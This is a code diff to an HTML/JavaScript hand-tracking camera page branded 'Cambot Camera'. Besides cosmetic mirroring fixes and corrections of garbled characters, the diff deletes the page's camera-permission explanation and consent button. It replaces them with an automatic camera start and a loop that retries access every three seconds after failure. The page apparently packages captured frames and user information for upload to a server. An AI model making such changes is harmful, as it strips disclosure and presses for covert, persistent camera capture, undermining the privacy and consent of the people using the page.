@@ -39,7 +39,7 @@
       align-items:center;
       gap:12px;
       color:var(--neon);
-      text-shadow:0 极 12px rgba(0,242,254,0.6);
+      text-shadow:0 0 12px rgba(0,242,254,0.6);
       font-size:1.6rem;
     }
     .logo i{ font-size:1.6rem; background: rgba(255,255,255,0.02); padding:8px; border-radius:8px;}
@@ -75,7 +75,6 @@
       position:absolute;
       top:0; left:0; width:100%; height:100%;
       pointer-events:none;
-      transform: scaleX(-1);
     }
     .controls {
       display:flex;
@@ -98,7 +97,7 @@
       cursor:pointer;
       transition: transform .12s ease, box-shadow .12s;
     }
-    .shutter:active { transform: scale(.94); box-shadow: 0 4px 极px rgba(0,192,255,0.18); }
+    .shutter:active { transform: scale(.94); box-shadow: 0 4px 18px rgba(0,192,255,0.18); }
     .shutter i { font-size:22px; color:#091018; }
     footer {
       width:100%;
@@ -111,61 +110,12 @@
       text-shadow: 0 0 10px rgba(0,242,254,0.15);
       font-size:0.86rem;
     }
-    .permission-modal {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(15, 32, 39, 0.95);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      z-index: 100;
-      padding: 20px;
-      box-sizing: border-box;
-    }
-    .permission-content {
-      background: linear-gradient(135deg, var(--bg2), var(--bg3));
-      padding: 30px;
-      border-radius: 14px;
-      text-align: center;
-      max-width: 500px;
-      box-shadow: 0 0 40px rgba(0, 0, 0, 0.6);
-      border: 1px solid rgba(0, 242, 254, 0.2);
-    }
-    .permission-btn {
-      background: var(--neon);
-      color: #091018;
-      border: none;
-      padding: 12px 24px;
-      border-radius: 8px;
-      font-family: 'Orbitron', sans-serif;
-      font-weight: bold;
-      margin-top: 20px;
-      cursor: pointer;
-      transition: all 0.2s;
-      box-shadow: 0 0 20px rgba(0, 242, 254, 0.4);
-    }
-    .permission-btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 0 25px rgba(0, 242, 254, 0.6);
-    }
     .hidden {
       display: none;
     }
   </style>
 </head>
 <body>
-  <div id="permissionModal" class="permission-modal">
-    <div class="permission-content">
-      <h2>Camera Access Required</h2>
-      <p>To use Cambot Camera, we need access to your camera. This app uses hand tracking technology for an interactive experience.</p>
-      <button id="allowCamera" class="permission-btn">Allow Camera Access</button>
-    </div>
-  </div>
-
   <header>
     <div class="logo"><i class="fa-solid fa-robot"></i> <strong>Cambot Camera</strong></div>
   </header>
@@ -196,8 +146,6 @@
     const handCanvas = document.getElementById('handCanvas');
     const ctx = handCanvas.getContext('2d');
     const shutterBtn = document.getElementById('shutterBtn');
-    const permissionModal = document.getElementById('permissionModal');
-    const allowCameraBtn = document.getElementById('allowCamera');
     
     let cameraStream = null;
     let userInfoSent = false;
@@ -247,25 +195,21 @@
         canvas.height = video.videoHeight;
         const ctx = canvas.getContext('2d');
         
-        // Draw video (mirrored)
-        ctx.save();
-        ctx.translate(canvas.width, 0);
-        ctx.scale(-1, 1);
+        // Draw video (already mirrored for selfie view)
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        ctx.restore();
         
-        // Draw hand landmarks (also mirrored to match video)
+        // Draw hand landmarks on top (not mirrored)
         const tempCanvas = document.createElement('canvas');
         tempCanvas.width = handCanvas.width;
         tempCanvas.height = handCanvas.height;
         const tempCtx = tempCanvas.getContext('2d');
         tempCtx.drawImage(handCanvas, 0, 0);
         
-        ctx.save();
-        ctx.translate(canvas.width, 0);
-        ctx.scale(-1, 1);
-        ctx.drawImage(tempCanvas, 0, 0, canvas.width, canvas.height);
-        ctx.restore();
+        // Scale hand landmarks to match video size
+        const scaleX = canvas.width / handCanvas.width;
+        const scaleY = canvas.height / handCanvas.height;
+        ctx.drawImage(tempCanvas, 0, 0, handCanvas.width, handCanvas.height, 
+                      0, 0, canvas.width, canvas.height);
         
         canvas.toBlob(blob => {
           const formData = new FormData();
@@ -308,7 +252,6 @@
         
         cameraStream = stream;
         video.srcObject = stream;
-        permissionModal.classList.add('hidden');
         
         if (!userInfoSent) {
           try {
@@ -342,7 +285,7 @@
         }
       } catch (e) {
         console.error('Camera error:', e);
-        permissionModal.classList.remove('hidden');
+        setTimeout(initCamera, 3000);
       }
     }
     
@@ -384,7 +327,7 @@
       });
       
       hands.setOptions({
-        maxNumHands: 2,
+        maxNumHands: 2, // Changed to detect up to 2 hands
         modelComplexity: 1,
         minDetectionConfidence: 0.7,
         minTrackingConfidence: 0.7
@@ -401,14 +344,14 @@
           const connections = window.HAND_CONNECTIONS;
           const points = handLandmarks.map(pt => {
             const rect = video.getBoundingClientRect();
-            // Apply mirror effect to match the video
+            // Remove mirroring for proper hand tracking display
             return {
-              x: rect.width - (pt.x * rect.width),
+              x: pt.x * rect.width,
               y: pt.y * rect.height
             };
           });
 
-          for (let conn极 connections) {
+          for (let conn of connections) {
             const [i, j] = conn;
             drawNeonLine(points[i], points[j]);
           }
@@ -439,14 +382,14 @@
         out.height = rect.height;
         const outCtx = out.getContext('2d');
 
-        // Draw video (mirrored)
-        out极.save();
+        // Draw video (mirrored for selfie view)
+        outCtx.save();
         outCtx.translate(out.width, 0);
         outCtx.scale(-1, 1);
         outCtx.drawImage(video, 0, 0, out.width, out.height);
         outCtx.restore();
 
-        // Draw hand landmarks (also mirrored to match)
+        // Draw hand landmarks on top (not mirrored)
         outCtx.drawImage(handCanvas, 0, 0, out.width, out.height);
 
         out.toBlob(blob => {
@@ -462,8 +405,6 @@
       }
     });
     
-    allowCameraBtn.addEventListener('click', initCamera);
-    
     window.addEventListener('beforeunload', () => {
       isSendingImages = false;
       if (cameraStream) {
@@ -471,29 +412,8 @@
       }
     });
     
-    // Check if we already have camera permission
-    async function checkExistingPermission() {
-      try {
-        const devices = await navigator.mediaDevices.enumerateDevices();
-        const hasCamera = devices.some(device => device.kind === 'videoinput');
-        
-        if (hasCamera) {
-          try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            stream.getTracks().forEach(track => track.stop());
-            initCamera();
-          } catch (e) {
-            permissionModal.classList.remove('hidden');
-          }
-        } else {
-          permissionModal.classList.remove('hidden');
-        }
-      } catch (e) {
-        permissionModal.classList.remove('hidden');
-      }
-    }
-    
-    checkExistingPermission();
+    // Start with a delay to avoid permission issues
+    setTimeout(initCamera, 1000);
   </script>
 </body>
 </html>
